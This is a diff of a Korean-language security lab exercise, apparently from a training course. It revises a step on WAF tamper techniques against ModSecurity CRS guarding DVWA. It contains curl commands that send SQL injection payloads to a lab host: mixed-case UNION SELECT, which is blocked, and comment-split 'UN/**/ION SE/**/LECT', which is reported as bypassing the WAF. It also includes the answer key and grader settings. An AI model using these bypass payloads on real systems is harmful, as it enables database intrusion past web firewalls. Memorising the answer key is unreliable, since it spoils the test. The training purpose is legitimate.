@@ -100,45 +100,57 @@ steps:
 
   - order: 3
     instruction: |
-      ## 🎯 WAF 우회(tamper) 시도 — CRS 의 정규화라는 벽
-      payload 를 변형해 WAF 시그니처를 피하려는 시도가 tamper 다. 두 가지 고전 기법을 직접 넣어 본다 —
-      키워드 사이에 SQL 주석을 끼우는 주석 삽입(`UN/**/ION SE/**/LECT`)과 대소문자를 섞는 변형
-      (`UnIoN sElEcT`). 둘 다 DB 는 정상 실행하지만 단순 시그니처는 못 알아본다. 그러나 ModSec CRS 는
-      검사 전에 입력을 표준형으로 되돌리는 정규화(normalization)를 하므로, 두 변형 모두 `UNION SELECT`
-      로 복원돼 결국 잡힌다. "우회는 쉽지 않다"를 눈으로 확인하는 단계다.
+      ## 🎯 WAF 우회(tamper) 시도 — 무엇이 막히고 무엇이 뚫리나
+      payload 를 변형해 WAF 시그니처를 피하는 시도가 tamper 다. 두 고전 기법을 직접 넣어 **어느 쪽이
+      막히고 어느 쪽이 뚫리는지** 실측한다 — 대소문자 섞기(`UnIoN sElEcT`)와 키워드 사이 주석 삽입
+      (`UN/**/ION SE/**/LECT`). 둘 다 DB 는 정상 실행하지만 단순 시그니처는 못 알아본다.
+
+      ## 📖 개념 한 줄
+      ModSec CRS 는 검사 전 입력을 표준형으로 되돌리는 정규화(normalization)를 한다. 대소문자 변형은
+      정규화로 복원돼 **여전히 차단(403)** 된다. 그러나 이 el34 CRS 3.3.2 의 SQLi 탐지(libinjection)는
+      키워드 사이 주석 분할을 못 복원해 **주석삽입은 실제로 우회(302)** 된다 — "정규화가 모든 변형을
+      잡는다"는 통념이 깨지는 실측 사례다(우회 성공이 곧 더 강력한 교훈).
       ## 💻 실행 명령 (한 줄씩 따라 실행)
       ```bash
-      # 1) 주석 삽입 tamper — UN/**/ION SE/**/LECT(키워드 중간 SQL 주석)
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'comment=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT%201--\""
-      # 2) 대소문자 tamper — UnIoN sElEcT(키워드 대소문자 무관)
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'case=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UnIoN%20sElEcT%201--\""
-      # 3) 해석 — CRS는 정규화 후 검사 → 단순 tamper는 대부분 여전히 403, 우회는 어렵다
-      echo "→ CRS는 정규화 후 검사 → 단순 tamper(주석/대소문자)는 대부분 여전히 403. 우회는 어렵다"
+      # 1) 대소문자 tamper — UnIoN sElEcT (정규화로 복원되어 차단되는지)
+      K=$(docker exec el34-attacker sh -c "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UnIoN%20sElEcT%201--\"")
+      echo "case=$K"
+      # 2) 주석삽입 tamper — UN/**/ION SE/**/LECT (키워드 사이 주석으로 토큰을 깨뜨림)
+      C=$(docker exec el34-attacker sh -c "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT%201--\"")
+      echo "comment=$C"
+      # 3) 판정 — 주석삽입이 차단(403)도 무응답(000)도 아니면 우회 성공
+      if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석삽입 우회 성공(comment=$C): 정규화가 주석분할은 못 잡음"; else echo "→ 주석삽입 차단/무응답(comment=$C)"; fi
+      # 4) 대조 — 대소문자는 정규화로 복원돼 차단(403)
+      echo "→ 대조: 대소문자(case=$K)는 정규화로 복원돼 차단. tamper도 기법마다 결과가 다르다"
       ```
-      - `UN/**/ION SE/**/LECT`(SQL 인라인 주석 `/**/` 삽입), `UnIoN sElEcT`(대소문자 섞기). DB 는 정상 실행하지만 CRS 가 정규화로 복원해 잡는다.
+      - `UnIoN sElEcT`(대소문자 섞기 — 정규화로 복원→403), `UN/**/ION SE/**/LECT`(SQL 인라인 주석 `/**/` 삽입 — libinjection 미복원→302 우회).
 
       ## ✅ 합격 기준
-      `403` 출력 시 통과. **근거:** tamper 시도가 CRS 정규화로 대부분 여전히 403(차단)되면 통과 — CRS 942
-      룰군이 수십 변형을 포괄하므로 단순 우회는 무력하다.
+      `우회 성공` 출력 시 통과. **근거:** 실측상 대소문자(case=403)는 차단되지만 주석삽입(comment=302)은
+      이 CRS 를 우회한다 — 두 결과의 대조로 "정규화가 모든 변형을 잡지는 못함"을 확인(우회가 안 되면 미통과).
     hint: 'UN/**/ION, UnIoN tamper → 결과'
     category: manipulation
     points: 14
     answer: |
-      # 1) 주석 삽입 tamper — UN/**/ION SE/**/LECT(키워드 중간 SQL 주석)
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'comment=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT%201--\""
-      # 2) 대소문자 tamper — UnIoN sElEcT(키워드 대소문자 무관)
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'case=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UnIoN%20sElEcT%201--\""
-      # 3) 해석 — CRS는 정규화 후 검사 → 단순 tamper는 대부분 여전히 403, 우회는 어렵다
-      echo "→ CRS는 정규화 후 검사 → 단순 tamper(주석/대소문자)는 대부분 여전히 403. 우회는 어렵다"
-    answer_detail: "주석 삽입·대소문자·인코딩 같은 단순 tamper 는 ModSec CRS 가 검사 전에 입력을 표준형으로 되돌리는 정규화(normalization) 때문에 대부분 무력하다 — 변형이 UNION SELECT 로 복원돼 여전히 403. CRS 942 룰군이 수십 가지 SQLi 변형을 포괄하므로, 우회하려면 정규화의 빈틈을 노리는 고급 기법이 필요하다. 여전히 차단(403)되는 결과로 CRS 의 견고함을 판정한다."
+      # 1) 대소문자 tamper — UnIoN sElEcT (정규화로 복원되어 차단되는지)
+      K=$(docker exec el34-attacker sh -c "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UnIoN%20sElEcT%201--\"")
+      echo "case=$K"
+      # 2) 주석삽입 tamper — UN/**/ION SE/**/LECT (키워드 사이 주석으로 토큰을 깨뜨림)
+      C=$(docker exec el34-attacker sh -c "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT%201--\"")
+      echo "comment=$C"
+      # 3) 판정 — 주석삽입이 차단(403)도 무응답(000)도 아니면 우회 성공
+      if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석삽입 우회 성공(comment=$C): 정규화가 주석분할은 못 잡음"; else echo "→ 주석삽입 차단/무응답(comment=$C)"; fi
+      # 4) 대조 — 대소문자는 정규화로 복원돼 차단(403)
+      echo "→ 대조: 대소문자(case=$K)는 정규화로 복원돼 차단. tamper도 기법마다 결과가 다르다"
+    answer_detail: "tamper 의 두 결과를 대조한다. 대소문자(UnIoN)는 ModSec CRS 의 정규화로 UNION 으로 복원돼 여전히 942 룰에 차단(403). 그러나 키워드 사이 주석 분할(UN/**/ION)은 이 el34 CRS 3.3.2 의 libinjection 이 토큰을 복원하지 못해 실제로 우회(302)된다. '정규화가 모든 변형을 잡는다'는 통념과 달리 주석삽입은 유효한 우회 경로다 — 판정은 comment 응답이 차단(403)이 아닌 우회임을 게이트한다(대소문자 차단·주석삽입 우회의 대조가 핵심)."
     verify:
       type: output_contains
-      expect: '403'
+      expect: '우회 성공'
       field: stdout
       semantic:
-        intent: "WAF 우회 시도 + CRS 한계 이해"
-        success_criteria: ["tamper 시도", "CRS 정규화로 여전히 차단"]
-        acceptable_methods: ["**[OSS] tamper payload 시도 (권장)**"]
+        intent: "WAF tamper — 차단(대소문자)과 우회(주석삽입) 대조"
+        success_criteria: ["대소문자 403 차단", "주석삽입 302 우회"]
+        acceptable_methods: ["**[OSS] tamper 변형별 응답 비교 (권장)**"]
     target_vm: web
 
   - order: 4
